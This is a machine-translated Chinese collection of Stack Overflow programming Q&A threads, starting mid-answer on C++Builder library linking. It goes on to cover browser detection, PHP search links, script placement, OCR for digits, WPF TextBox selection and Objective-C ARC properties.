每当您希望 IDE 为您修改 LinkPackageStatics 或 LinkPackageImports 时，您需要首先在 IDE 中构建项目；然后对项目选项进行微小的更改（并撤消它）；然后保存项目。此时，IDE 会将 LinkPackageStatics 或 LinkPackageImports 写入 cbproj，以便您的项目可以在命令行上链接。

**链接库的其他方法**——还有几种方法可以指定要链接的文件，它们不涉及这四个标签。您可以将 .lib 直接添加到项目中（右键单击项目 | 添加...），或者您可以`#pragma comment (lib, "libraryname.lib")`在与项目一起编译的文件之一中插入该行。

如果将 .lib 直接添加到项目中，它将与所有其他要链接的库一起出现在命令行上。如果您使用该`#pragma comment`技巧，该库将不会出现在命令行上，并且您将无法看到它已链接（除非通过使用`tdump`和查看导出）。

**概括**

从命令行链接时，唯一有效的 cbproj 标签（这五个标签）是 LinkPackageStatics（添加到 objfiles 部分的库）和 LinkPackageImports（添加到 libfiles 部分的库）。这些标签的内容由 IDE 从 AllPackageLibs 和 PackageImports 计算，但如果您需要从命令行链接，您可以在 .cbproj 中手动设置它们。

从 IDE 链接时，您通常希望 IDE 为您管理库。如果您需要添加 IDE 无法自动检测到的库，您应该在外部编辑器中打开 .cbproj 文件并将缺少的库添加到 AllPackageLibs 标记。如果您希望库被动态链接，您还应该将库名称添加到“使用运行时包构建”列表（又名 PackageImports）。

如果要确保动态链接所有库，请查看 .cbproj 文件中的 LinkPackageStatics 标记。如果该列表中有任何库，则它们是静态链接的。要解决此问题，请将这些库的名称复制到 PackageLibs 标记中（并将其扩展名更改为 bpi）；然后删除 LinkPackageStatics 标记。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-10T13:52:16.953

伙计，我希望你已经找到了解决问题的方法，但我认为你只需要禁用 Build With Runtime Packages，禁用 Use Dynamic RTL 并从 Debug 更改为 Release 构建，对于你正在使用的所有项目（[http:// bcbjournal.org/articles/vol4/0009/Building_stand-alone_EXEs.htm?PHPSESSID=08f2084c32d5fce05f13518fef23f358](http://bcbjournal.org/articles/vol4/0009/Building_stand-alone_EXEs.htm?PHPSESSID=08f2084c32d5fce05f13518fef23f358)）。

如果您有一些无法更改的组件，例如某些二进制文件（dll、lib...），那么如果这些禁用选项之前是用它们构建的，您仍然会依赖于这些禁用选项...

我建议您在构建之前从您的项目中删除所有 *.obj 和 *.exe（除非它们是某些 3rd 方模块的必需品）... 一些较旧的 C++ Builder 版本有一些构建问题已解决方法。

# asp.net-mvc - 浏览器检测在生产环境中无法始终如一地工作

> ID：11786901
> 
> 赞同：1
> 
> 时间：2012-08-02T22:46:07.560
> 
> 标签：asp.net-mvc, http, redirect, web, browser-detection

我目前面临一个非常不一致的问题。基本上，我的应用程序中有一个浏览器检测例程，它将嗅探任何传入请求的用户代理，如果它来自受支持的浏览器，那么它将继续加载应用程序。但如果它不受支持，则会重定向到“Notsupported.html”。

几个月前我写这段代码的时候。它在我的机器上运行良好。我上交了它，它在 Dev Server 上运行良好。在测试服务器上很棒。没有人见过这个问题。

现在，一旦移植到实际环境，当用户第一次加载它时，有时它会加载浏览器不支持的页面，并且用户的机器已经空闲了一段时间。有时也不要闲着一会儿。它只是随机发生，但在机器闲置一段时间或机器刚刚重新启动后，会更频繁地注意到发生。但不能保证它一定会发生。

我很确定 Production 有许多与其他环境不同的设置，但我不知道为什么它无法检测到生产机器中的浏览器，而不是其他任何地方。我正在尝试重现问题，但它完全不可重复。

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:51:31.000

用户代理不是确定客户端正在使用的浏览器的一种非常可靠的方法，因为它们可以被用户修改。更好的方法是专门检测浏览器是否支持您的应用程序需要的功能，例如[modernizr](http://modernizr.com/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-03T05:12:16.953

在 IE 中它可以与兼容模式链接。如果ie处于竞争模式，它会发送关于自己的非常奇怪的信息

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T22:50:50.720

> 它只是随机发生

计算机的好处是它们从不随意做任何事情:)

您提供的有关如何检测浏览器的信息很少。你用的是什么代码？你支持哪些浏览器？哪些用户代理被错误重定向？

还要记住，许多应用程序会更改用户代理，例如宣传机器上存在的 .NET 版本。这可能会导致错误匹配。

# php - 防止服务器在图像文件中添加斜杠

> ID：11786903
> 
> 赞同：0
> 
> 时间：2012-08-02T22:46:18.790
> 
> 标签：php, .htaccess

如何防止服务器从 /images/img.png 重定向到 /images/img.png/ ？我只能使用 htaccess。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T23:00:58.843

这不是默认行为，因此在您的服务器配置中的某处，您有如下内容：

```
RewriteCond %{REQUEST_URI} ^(/.+[^/]) [NC]
RewriteRule .  %1/  [L,R=301] 
```

您可以通过简单地从全局配置中的任何位置删除该规则来阻止这种情况。

如果那不可能；尝试通过添加`RewriteEngine Off`您的`.htaccess`.

# notepad++ - 如何在 Notepad++ 中将语言与没有扩展名的文件相关联

> ID：11786906
> 
> 赞同：4
> 
> 时间：2012-08-02T22:46:50.670
> 
> 标签：notepad++

我想在 Notepad++ 中编辑 Gemfile，但由于 Gemfile 没有扩展名，似乎没有办法让 Notepad++ 自动将 Gemfile 检测为 Ruby 文件。每次打开 Gemfile 时，我都必须手动设置语言。

有没有办法让 Notepad++ 根据文件的全名而不是扩展名来识别文件的语言？有这个插件吗？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-28T23:07:09.783

我找到了一个插件，它可以检测基于 vi 模式和 shebangs et 的语言：

[http://sourceforge.net/projects/npppythonplugsq/files/Modelline%20Parser/](http://sourceforge.net/projects/npppythonplugsq/files/Modeline%20Parser/)

您需要从插件管理器安装 Python Script 插件，并手动安装 ModelineParser_0.2.zip 如果需要，可以添加您自己的自定义识别字符串。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-23T18:21:48.363

正如 BoltClock 所说，并非没有插件。在其他人提供更好的答案之前，我会将其标记为答案。

# php - 如何将链接添加到搜索结果

> ID：11786910
> 
> 赞同：0
> 
> 时间：2012-08-02T22:47:07.333
> 
> 标签：php, hyperlink

我编写了这段代码来启用对我的数据库的搜索，然后显示结果。（代码复制如下）

我需要一些帮助，因为我需要知道如何从搜索结果中创建链接，以便他们可以单击结果并自动在新网页上打开详细信息。

我对 PHP 非常陌生，因此任何人都可以提供任何帮助，我们将不胜感激。

谢谢

```
<?php
error_reporting(E_ALL);
ini_set('display_errors', '1');
$search_output = "";
if(isset($_POST['searchquery']) && $_POST['searchquery'] != ""){
     $searchquery = preg_replace('#[^a-z 0-9?!]#i', '', $_POST['searchquery']);
     if($_POST['filter1'] == "Whole Site"){
         $sqlCommand = "(SELECT id, title AS title FROM cars WHERE title LIKE '%$searchquery%' OR description LIKE '%$searchquery%') UNION (SELECT id, title AS title FROM motorcycles WHERE title LIKE '%$searchquery%' OR description LIKE '%$searchquery%')";
     } else if($_POST['filter1'] == "cars"){
         $sqlCommand = "SELECT id, title AS title FROM cars WHERE title LIKE '%$searchquery%' OR description LIKE '%$searchquery%'";
     } else if($_POST['filter1'] == "motorcycles"){
         $sqlCommand = "SELECT id, title AS title FROM motorcycles WHERE title LIKE '%$searchquery%' OR description LIKE '%$searchquery%'";
     }
        include_once("testconn2.php");
        $query = mysql_query($sqlCommand) or die(mysql_error());
     $count = mysql_num_rows($query);
     if($count > 1){
         $search_output .= "<hr />$count results for <strong>$searchquery</strong><hr />$sqlCommand<hr />";
         while($row = mysql_fetch_array($query)){
                 $id = $row["id"];
            $title = $row["title"];
            $search_output .= '<a href="item.php"' .$_SERVER['PHP_SELF'] . '"?c=$catId&p=' . $id . '">' .$title . '</a><br>';
                } // close while
     } else {
         $search_output = "<hr />0 results for <strong>$searchquery</strong><hr />$sqlCommand";
     }
}
?>
<html>
<head>
</head>
<body>
<h2>Search the Database </h2>   <h4><a href="Sign in.php">Sign in</a> <a href="UserRegistration.php">Register</a></h4>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
Search For: 
  <input name="searchquery" type="text" size="44" maxlength="88"> 
Within: 
<select name="filter1">
<option value="Whole Site">Whole Site</option>
<option value="Cars">Cars</option>
<option value="Motorcycles">Motorcycles</option>
</select>
<input name="myBtn" type="submit">
<br />
</form>
<div>
<?php echo $search_output; ?>
</div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T22:54:14.217

看起来您已经在此处获得了指向搜索结果的链接，对吗？

```
 $search_output .= '<a href="item.php"' .$_SERVER['PHP_SELF'] . '"?c=$catId&p=' . $id . '">' .$title . '</a><br>'; 
```

您可能想要删除 $_SERVER['PHP_SELF'] 或将其移动到 item.php 之前，因为它会将其附加到您的文件名中，我确定您不希望这样做。

现在您所要做的就是创建您的 item.php 页面，并使用 $_GET['id'] 获取您要查找的项目的 ID。

一旦你得到你正在寻找的项目，你就可以对你的数据库进行查询。

您还应该考虑使用[PDO](http://php.net/manual/en/book.pdo.php)或[mysqli](http://php.net/manual/en/book.mysqli.php)而不是常规的 mysql 命令，因为现在不推荐使用它们。

获取参考，可以试试[w3schools](http://www.w3schools.com/php/php_get.asp)或者[PHP 的手册](http://php.net/manual/en/reserved.variables.get.php)。

希望这可以帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:55:07.317

```
<a href="item.php"' .$_SERVER['PHP_SELF'] . '"?c=$catId&p=' . $id . '" taget="_blank">' .$title . '</a><br>'; 
```

我那部分只是使用“_blank”目标并在您的链接页面中使用 $_GET 变量来显示您的结果。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T23:04:30.480

```
$search_output .= '<a href="item.php"' .$_SERVER['PHP_SELF'] . '"?c=$catId&p=' . $id . '">' .$title . '</a><br>'; 
```

包含在`$_SERVER['PHP_SELF']`双引号之外，看起来它会产生类似的东西

```
<a href="item.php"search.php"?c=1&p=1">Title</a><br> 
```

更有可能你只是想要（哦，编码你的＆符号）

```
$search_output .= '<a href="item.php?$catId&amp;p=$id">$title</a><br>'; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T22:51:38.100

将表单方法替换为“get”而不是“post”，然后在提交表单时，它将生成您要查找的链接。

```
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="get"> 
```

该链接将如下所示：

```
http://yourwebsite/yourfile.php?searchquery=sometext&fillter1=somevalue1&myBtn=submit 
```

# javascript - 页面底部的JavaScript？

> ID：11786915
> 
> 赞同：21
> 
> 时间：2012-08-02T22:47:27.540
> 
> 标签：javascript, jquery, html, html5boilerplate

我读过最好将所有 JavaScript 文件放在网页底部。HTML5 Boilerplate 模板似乎同意：[http ://html5boilerplate.com/](http://html5boilerplate.com/)

并且似乎被广泛使用。

我的问题是：首先，这有什么真正的依据吗？我已经在 Firebug 中进行了测试，它似乎有一些小的影响，但它是微不足道的吗？在加载 CSS 文件和脚本文件之前，图像和其他来源似乎不会开始加载，但将它们放在底部似乎根本没有太大区别。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-08-02T22:53:11.353

**出于最佳实践的原因，这非常重要。**

当您在标题中加载脚本时，它们会阻止其他下载发生！这包括您的样式，并且还将停止您的图像下载，直到脚本完成。

这是因为 JavaScript 文件是同步加载的。

另请注意，如果您不将 JavaScript 文件移动到页面底部，则在加载过程中会出现[一闪而过的无样式内容 (FOUT) 。](http://en.wikipedia.org/wiki/Flash_of_unstyled_content)这是因为您的 CSS 在脚本完成加载之前不会下载。

* * *

这是雅虎性能规则 6 的摘录。

> 由脚本引起的第二个问题是阻止并行下载。HTTP/1.1 规范建议浏览器每个主机名并行下载不超过两个组件。如果您从多个主机名提供图像，则可以同时进行两次以上的下载。（我让 Internet Explorer 可以并行下载 100 多个图像。）然而，在下载脚本时，浏览器不会启动任何其他下载，即使在不同的主机名上也是如此。

* * *

**参考**

[http://developer.yahoo.com/performance/rules.html/](http://developer.yahoo.com/performance/rules.html/)

特别注意[规则 6](http://developer.yahoo.com/blogs/ydn/posts/2007/07/high_performanc_5/)。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2013-08-24T17:45:07.907

我们最近在办公室进行了这场辩论。我写[了一篇很长的帖子](http://demianlabs.com/lab/post/top-or-bottom-of-the-page-where-should-you-load-your-javascript/)，在其中发表了我对这个主题的看法。简短的回答是，这真的取决于你在做什么。对于面向内容的网页，底部放置似乎效果最好。然而，当一个人在创建功能是主要优先级的 Web 应用程序时，放在顶部有它的优势。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-02T22:54:10.703

JavaScript 同步加载。将其与通常较大的文件大小配对，并且您的内容由于同步 JavaScript 加载而延迟加载。如果您将 JavaScript 放在页面底部，则首先加载其他所有内容，并且 JavaScript 加载不会阻止任何内容。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-02T22:53:50.677

基本上，当浏览器点击一个`<script>`标签时，它会停止加载文档的其余部分，直到它`<script>`被加载并执行。

# ocr - 检测数字笔迹的 OCR 解决方案？

> ID：11786918
> 
> 赞同：5
> 
> 时间：2012-08-02T22:47:47.270
> 
> 标签：ocr

有没有在数字（1-10）手写方面做得很好的解决方案？我尝试了 tesseract，但我得到的只是垃圾。

理想情况下是 OSS，但商业也可以。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-04T12:49:41.767

OpenCV 现在带有手写数字识别 OCR 示例。你可以参考它：[http ://code.opencv.org/projects/opencv/repository/revisions/master/entry/samples/python2/digits.py](http://code.opencv.org/projects/opencv/repository/revisions/master/entry/samples/python2/digits.py)

它使用 kNN 和 SVM 来训练一些手写数字，然后对其应用 OCR。

下面是kNN训练的输出（误差只有3.5%）：

![在此处输入图像描述](../Images/86842f95c94aa83d4e8278bd3828d290.png)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-01-12T09:45:53.180

我在搜索时看到了你的帖子，它吸引了我进行一些有趣的研究。我将与您和论坛分享我的一些发现：

手写识别（ICR，基于神经网络）和由此产生的 OCR 解决方案的研究真正起步较晚。在过去的十年中已经提出了许多算法，但手写识别仍然是一个挑战！

首先，一些指向免费编程资源的指针（MB，您对您的编程环境或操作系统只字未提，所以我的建议主要涵盖 Windows。）

1.  www.codeproject.com/Articles/143059/Neural-Network-for-Recognition-of-Handwritten-Digi 这是用于在 C# 中识别手写数字的神经网络的页面 这是 Mike O' 在 C# 中的基本返工尼尔的手写数字识别神经网络采用 MFC/C++ 模型。有关 O'Neill 工作的更多信息，请访问：www.codeproject.com/KB/library/NeuralNetRecognition.aspx。

2.  [http://asprise.com/product/ocr/selector.php](http://asprise.com/product/ocr/selector.php) 他们的解决方案是针对 Visual Basic，所以 Windows 是主要的吸引力，但我看到他们支持 Linux、Mac OS 和一些 UNIX 风格。SDK 是免费的！从这里下载：www.asprise.com/product/ocr/download.php?lang=vb

    （我在这个论坛的另一个地方看到了关于 asprise 的积极反馈： [Window 7 OCR API](https://stackoverflow.com/questions/6100404/window-7-ocr-api/6331304#6331304)）

3.  这是另一个很棒的资源 - 用于测试 OCR 能力的手写数据库，在这里：www.yann.lecun.com/exdb/mnist/index.html 这是 MNIST 手写数字数据库的主页（60,000 个示例，以及一个测试集10,000 个示例）该网站表示，这些数字已经被大小标准化并以固定大小的图像为中心，因此您可以专注于学习技术和模式识别方法来处理现实世界的数据，并最大限度地减少预处理和格式化工作。

    MNIST 是更大的 NIST 数据库的（免费）子集，可在此处（*付费*）获得：www.nist.gov/srd/nistsd19.cfm

## 商业解决方案

1.  www.captricity.com/handwriting-ocr-software/ 此解决方案可处理任何自由格式的手写输入。

    该软件可以转换所有静态文档，包括纸质、PDF、传真、efax，以及任何类型的手写和人工标记。他们有“随用随付”模式（免费 10 页）和每月 75 美元的最低付费解决方案。

2.  www.cvisiontech.com/trapeze/general/trapeze.html?lang=eng CVISION 的 Trapeze for Forms 处理来自结构化表单的字段数据内的手写输入。

    它验证信息并将此信息输出到文档数据库中。

一些！

# javascript - 用modernizr在ie中测试指针事件

> ID：11786919
> 
> 赞同：1
> 
> 时间：2012-08-02T22:47:48.027
> 
> 标签：javascript, css, debugging, modernizr

指针事件：没有在 ie 中不起作用，但

```
Modernizr.testAllProps('pointerEvents'); 
```

在 ie 中返回 true。请帮我让ie说实话，或者如果它说的是实话，为什么我不能像在其他浏览器中那样实现它？

谢谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-03T00:11:06.180

查看[https://github.com/Modernizr/Modernizr/issues/80](https://github.com/Modernizr/Modernizr/issues/80)与检测的测试和结果一起讨论的地方：[https ://github.com/ausi/Feature-detection-technique-for-pointer-events /维基](https://github.com/ausi/Feature-detection-technique-for-pointer-events/wiki)

您使用的是最新版本的 Modernizr 吗？如果是这样，请在 #80 线程上使用可重现的案例。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-06-16T23:34:16.743

看起来这将是[Modernizr 3+](http://v3.modernizr.com/download/)中的一个标志（v3 目前处于 beta beta 阶段）。用法很简单：

```
if ( Modernizr.csspointerevents ) {
    // use pointer events
} else {
    // do fallback magic
} 
```

# c# - 在 C# 中通过 WebRequest 方法登录的特殊 cookie

> ID：11786921
> 
> 赞同：0
> 
> 时间：2012-08-02T22:47:53.677
> 
> 标签：c#, cookies, webrequest

我尝试使用此代码从网站获取 cookie

```
CookieCollection cookies = new CookieCollection();
CookieContainer cooki = new CookieContainer();
HttpWebRequest request = (HttpWebRequest) WebRequest.Create(weburl.Text);
request.CookieContainer = cooki;
HttpWebResponse response = (HttpWebResponse)request.GetResponse();
StreamReader read = new StreamReader(response.GetResponseStream());
request.CookieContainer = cooki;
request.CookieContainer.Add(cookies);
cookies = response.Cookies;

if(response.Cookies != null &&  response.Cookies.Count != 0)
{
    foreach(Cookie c in response.Cookies)
        listBox2.Items.Add(c.ToString());

}
else
        listBox2.Items.Add("No Cookies"); 
```

但是，当我为[http://www.cloob.com](http://www.cloob.com)之类的网站尝试此操作时，什么也没有发生。

我在 C# 中通过 webbrowser 尝试了这个站点并尝试了这段代码

```
string cooki = webbrowser1.Document.Cookie.tostring(); 
```

我得到了很多这样的信息：

> 饼干=LMOT=1343810524；IdM=否；__utma=204761026.19745671.1343776441.1343805546.1343810526.4；__utmz=204761026.1343776441.1.1.utmccn=(直接)|utmcsr=(直接)|utmcmd=(无); CR=%7B%22online_count%22:%5B%7B%22count%22:8059,%22status%22:%22available%22%7D,%7B%22count%22:%221204%22,%22status%22:% 22invisible%22%7D,%7B%22count%22:%2276%22,%22status%22:%22busy%22%7D%5D%7D; m_id=1343781310_7982757; LCCT=1343809271；__utmb=204761026; __utmc=204761026

现在我怎样才能通过 webrequest 得到这个？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T23:10:43.777

虽然您的代码有点多余，但我认为它没有任何问题。当我针对`http://www.google.com/`. `http://www.cloob.com`可能是在 javascript 中设置 cookie，这可以解释为什么您可以在`WebBrowser`对象中看到 cookie，但不能使用`WebRequest`.

# oop - 用常规函数包装构造函数的理由？

> ID：11786923
> 
> 赞同：0
> 
> 时间：2012-08-02T22:48:11.217
> 
> 标签：oop

在另一个论坛上，我遇到了关于使用构造函数的一些极端情况的争论，我记得在某处读到过，禁止类自己的沙箱之外的代码调用该类的构造函数将被认为是一个很好的设计。该参数与调用定义为接受可变数量参数的超类构造函数有关，而所讨论的特定语言通常不允许调用构造函数。

我不记得是谁在什么场合这么说的，但我觉得这是一个值得尊重的来源，尽管我的记忆可能会出卖我。抛开语言细节不谈，这作为一种元语言的良好实践是否有意义，或者这只是一个虚构的规则/过于个人化而不能作为通用推荐？

以下是我能想到的一些理由：

1.  无论使用哪种语言，初始化顺序通常都存在问题，这通常是正在创建的对象所特有的，外部代码可能不知道这些特殊性/暴露这些特殊性可能会被视为泄漏对象的实现细节。

2.  构造函数内部的错误会给没有自动内存管理的语言带来困难。让外部代码管理此类错误几乎可以保证失败/内存​​泄漏。

3.  继承通常要求我们都能够从超类引用子类（匿名，例如通过调用抽象方法 - 想想 Java，这是有问题的）和返回（不一定是匿名的）。即，如果超类在其字段上调用函数，我们可能需要将这些字段预初始化为子类中的某些其他值，当然，我们可能需要在子类中使用超类初始化的产物。这可能需要在构造函数中添加“钩子”，但如果我们将“裸”构造函数暴露给外部代码（因为在这种情况下，外部代码可能会通过在约定之外工作而影响对象创建），这是不可能的正在初始化以及何时。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T01:15:04.157

您所指的通常称为*静态工厂方法*，是直接调用构造函数的替代方法。这是否是好的设计取决于用例。

通常首选直接调用构造函数，因为它是创建对象的自然方式，但是在许多情况下首选工厂方法。MSDN 上的这篇文章很好地总结了何时使用其中一个：[工厂与构造函数](http://blogs.msdn.com/b/kcwalina/archive/2004/10/11/241027.aspx)

不过，我认为我没有遇到过您提到的超类论点。

# jquery-mobile - 如何使用 jQuery 函数制作 jQuery Mobile 页面幻灯片？

> ID：11786925
> 
> 赞同：1
> 
> 时间：2012-08-02T22:48:31.890
> 
> 标签：jquery-mobile, slide, jquery, swipe

jQuery 函数（独立工作）：

```
$("#firstpage").live('pageinit', function (evt) {
    $("#firstpage").bind("swipeleft", function (e) {
        alert ("you swiped left!");
    });
}); 
```

jQuery 移动链接（也可以单独使用）：

```
<a href="#secondpage" data-transition="slide">GO TO PAGE 2</a> 
```

那么如何将两者结合起来呢？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T05:59:48.763

您可以使用`$.mobile.changePage()`，它是内部用于在页面之间转换的内容。这是一个例子：

```
$(document).delegate("#firstpage", 'pageinit', function (evt) {
    $(this).bind("swipeleft", function (e) {
        $.mobile.changePage("#secondpage", {
            transition : 'slide'
        });
    });
}).delegate("#secondpage", 'pageinit', function (evt) {
    $(this).bind("swiperight", function (e) {
        $.mobile.changePage("#firstpage", {
            transition : 'slide',
            reverse    : true
        });
    });
});​ 
```

这是一个演示：http: [//jsfiddle.net/QjUMh/](http://jsfiddle.net/QjUMh/)

查看文档`$.mobile.changePage`并查看它具有的所有选项：http: [//jquerymobile.com/demos/1.1.1/docs/api/methods.html](http://jquerymobile.com/demos/1.1.1/docs/api/methods.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-03T07:04:28.013

您可以使用`$.mobile.changePage()`方法来做到这一点。

检查 Jquery 移动文档
[http://jquerymobile.com/demos/1.1.1/docs/api/methods.html](http://jquerymobile.com/demos/1.1.1/docs/api/methods.html)

```
$("#firstpage").live('pageinit', function (evt) {
    $("#firstpage").bind("swipeleft", function (e) {
       $.mobile.changePage("#secondpage", { transition : 'slide'});
    });
}); 
```

# xpages - 如何使 XPages REST 控件返回过滤匹配的总数？

> ID：11786930
> 
> 赞同：1
> 
> 时间：2012-08-02T22:48:44.517
> 
> 标签：xpages

我正在调用一个 ExtLib REST 服务，它使用搜索词来过滤结果。

没有指示在返回的 JSON 中找到的结果总数

我希望能够在返回结果的顶部添加一个键，类似于 "searchCount="

无需进行单独的 FTSearch 和 dc.count，如何轻松实现这一目标？

```
{
    "@timestamp":"2012-08-02T22:47:15Z",
    "@toplevelentries":1301,
    "items":
    [
      {
          "@entryid":"877-06C896874946365E85257A4E00537736",
          "@unid":"06C896874946365E85257A4E00537736",
          "@noteid":"D26",
          "@position":"877",
          "@read":true,
          "@siblings":1298,
          "firstname":"Mary",
          "lastname":"Richard",
          "address":"44 Huntz Lane",
          "city":"QUINCY",
          "state":"MA"
      }
    ]
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-14T21:09:16.643

您是否使用道场商店来获取结果？商店知道您将获得多少结果。

要定义您自己的输出，我建议使用 xe:customRestService。您可以在此处搜索视图并以您喜欢的任何格式返回结果。

# c# - 选项卡上的文本框 SelectAll 但不是鼠标单击

> ID：11786931
> 
> 赞同：17
> 
> 时间：2012-08-02T22:48:48.303
> 
> 标签：c#, wpf, xaml, textbox, focus

因此，假设我有一个带有多个文本框的 WPF 表单，如果您选择到文本框并且其中已经有一些内容，我想选择该框中的所有文本，以便键入将删除该文本。如果您在该框上单击鼠标，则可能意味着您想在某处更改字母，因此在这种情况下不要突出显示所有字母。似乎很容易，但到目前为止我还没有找到一个好的解决方案。到目前为止，这是我非常*接近*工作的东西，但还不是很完美。

```
<Style x:Key="TextBoxStyle" TargetType="TextBox">
    <EventSetter Event="GotKeyboardFocus" Handler="EventSetter_OnHandler" />
</Style> 
```

```
private void EventSetter_OnHandler(object sender, RoutedEventArgs e)
{
    TextBox txt = sender as TextBox;
    if (txt != null) txt.SelectAll();
} 
```

因此，当该框获得键盘焦点时，它会选择所有文本，因此对文本框进行制表符可以完美地选择所有文本。但是，如果鼠标单击此方法也会被调用，这也会突出显示文本，但单击会将光标置于鼠标单击之后的位置。所以在功能上它是完美的，但它仍然困扰着我，当鼠标点击时它会闪烁选择所有内容。有没有更好的方法来做到这一点，或者在我的事件中进行某种检查以知道我通过鼠标单击而不是选项卡获得了键盘焦点？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-08-03T00:25:41.450

遗憾的是，到目前为止还没有看到任何干净的解决方案，您可以做的一件事就是检查鼠标状态：

```
var tb = (TextBox)sender;
if (Mouse.LeftButton != MouseButtonState.Pressed)
    tb.SelectAll(); 
```

但实际上有一个更好的方法，因为焦点转移到按键上，您可以改为检查键盘。我建议使用正确的`GotKeyboardFocus`处理程序签名来获取适当的事件参数：

```
private void TextBox_GotKeyboardFocus(object sender, KeyboardFocusChangedEventArgs e)
{
    if (e.KeyboardDevice.IsKeyDown(Key.Tab))
        ((TextBox)sender).SelectAll();
} 
```

此时，您可能仍会看到某些选择在单击时被清除，但这只是因为先前的选择仅在未聚焦时才会隐藏。您可以随时清除选择`LostKeyboardFocus`以防止这种情况发生（例如`((TextBox)sender).Select(0, 0)`）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-03T00:26:25.490

您可以尝试在焦点事件发生时检查鼠标是否存在于文本框中，并检查鼠标按钮按钮状态。这并不完美，但应该接近您正在寻找的内容。

```
private void EventSetter_OnHandler(object sender, RoutedEventArgs e)
{
    TextBox txt = sender as TextBox;
    Point position = Mouse.GetPosition(txt);
    // if Mouse position is not in the TextBox Client Rectangle
    // and Mouse Button not Pressed.
    if((!(new Rect(0,0,txt.Width,txt.Height)).Contains(position)) || ( Mouse.LeftButton != MouseButtonState.Pressed))
        if (txt != null) txt.SelectAll();
} 
```

正如 HB 指出的那样，您可以尝试使用 txt.IsMouseOver 属性来确定光标是否在文本框的客户端矩形内。看起来干净了很多。

```
private void EventSetter_OnHandler(object sender, RoutedEventArgs e)
{
    TextBox txt = sender as TextBox;
    if( !txt.IsMouseOver || Mouse.LeftButton != MouseButtonState.Pressed)
        if (txt != null) txt.SelectAll();
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T23:22:48.353

您*可以*捕获最后按下的键并在您的事件中与它进行比较

```
private Key lastKey;
protected override void OnKeyDown(KeyEventArgs e)
{
     lastKey = e.Key;
     base.OnKeyDown(e);
} 
```

在你的事件中：

```
private void EventSetter_OnHandler(object sender, RoutedEventArgs e)
{
    if(lastKey != Key.Tab)
        return;

    TextBox txt = sender as TextBox;
    if (txt != null) txt.SelectAll();
} 
```

这并不完美，因为他们可以点击标签（而不是标签进入您的控件）然后点击进入您的控件。但它会在大多数情况下工作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-03T00:33:13.860

您可以使用附加的行为模式

```
public class Behaviors
{
    public static readonly DependencyProperty SelectTextOnFocusProperty = DependencyProperty
        .RegisterAttached("SelectTextOnFocus", typeof(bool), typeof(Behaviors), new FrameworkPropertyMetadata(false, GotFocus));

    public static void SetSelectTextOnFocus(DependencyObject obj, bool value)
    {
        obj.SetValue(SelectTextOnFocusProperty, value);
    }

    private static void GotFocus(DependencyObject d, DependencyPropertyChangedEventArgs e)
    {
        var textbox = d as TextBox;

        if (null == textbox) return;

        textbox.GotKeyboardFocus += SelectTextOnFocus;
        textbox.GotMouseCapture += SelectTextOnFocus;
    }

    private static void SelectTextOnFocus(object sender, RoutedEventArgs e)
    {
        if (!(sender is TextBox)) return;
        ((TextBox)sender).SelectAll();
    }
} 
```

在您的 xaml 中只需要

```
xmlns:my="clr-namespace:Namespace;assembly=Rkmax" 
```

使用您可以在 TextBox 中使用

```
<TextBox my:Behaviors.SelectTextOnFocus="True" /> 
```

所有这些都适用于鼠标和键盘事件

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-01-23T19:35:18.670

我搜索了很多解决方案，我找到了几个 selectall 的解决方案但是，问题是当我们在从文本框中选择部分文本后右键单击并进行剪切/复制时，即使我选择了部分文本，它也会选择全部。在这里解决这个问题是解决方案。只需在键盘选择事件中添加以下代码。这对我有用。

```
 private static void SelectContentsChanged(DependencyObject d, DependencyPropertyChangedEventArgs e)
    {
        if (d is TextBox)
        {
            TextBox textBox = d as TextBox;
            if ((e.NewValue as bool?).GetValueOrDefault(false))
            {
                textBox.GotKeyboardFocus += OnKeyboardFocusSelectText;                 
            }
            else
            {
                textBox.GotKeyboardFocus -= OnKeyboardFocusSelectText;

            }
        }
    }

    private static void OnKeyboardFocusSelectText(object sender, KeyboardFocusChangedEventArgs e)
    {
        if (e.KeyboardDevice.IsKeyDown(Key.Tab))
            ((TextBox)sender).SelectAll();
    } 
```

# iphone - ARC：成员变量和属性有什么区别？

> ID：11786938
> 
> 赞同：0
> 
> 时间：2012-08-02T22:49:59.627
> 
> 标签：iphone, ios

我有一个在整个 UIViewController 中使用的 NSArray 对象。我可以将其声明为 ivar 或属性。这两种方法有什么优势（考虑到我使用的是 ARC）？

**选项1：**

```
@interface MyViewController {
    NSArray *_myArray;
}
@end 
```

**选项 2：**

```
@interface MyViewController
    @property (strong, nonatomic) NSArray *myArray;
@end 
